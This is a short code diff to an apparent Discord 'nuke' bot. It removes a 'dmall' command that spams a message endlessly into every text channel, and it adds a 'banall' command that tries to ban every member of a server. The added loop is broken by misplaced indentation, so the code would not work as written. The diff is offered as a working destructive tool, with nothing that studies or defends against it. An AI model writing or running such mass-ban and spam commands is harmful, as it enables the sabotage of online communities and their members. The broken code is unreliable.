@@ -69,14 +69,9 @@ async def cda(ctx):
             pass   
 
 @client.command()
-async def dmall(ctx, *, message ):
-  guild=ctx.message.guild
+async def banall(ctx, reason : str):
+  for member in ctx.guild.members:
   await ctx.message.delete()
-  for i in range(2):
-    print("dmed")
-    while True:
-           for member in guild.text_channels:
-                 await member.send(f"{message}")
-
+  await member.ban(reason=reason)
 
 client.run(token)
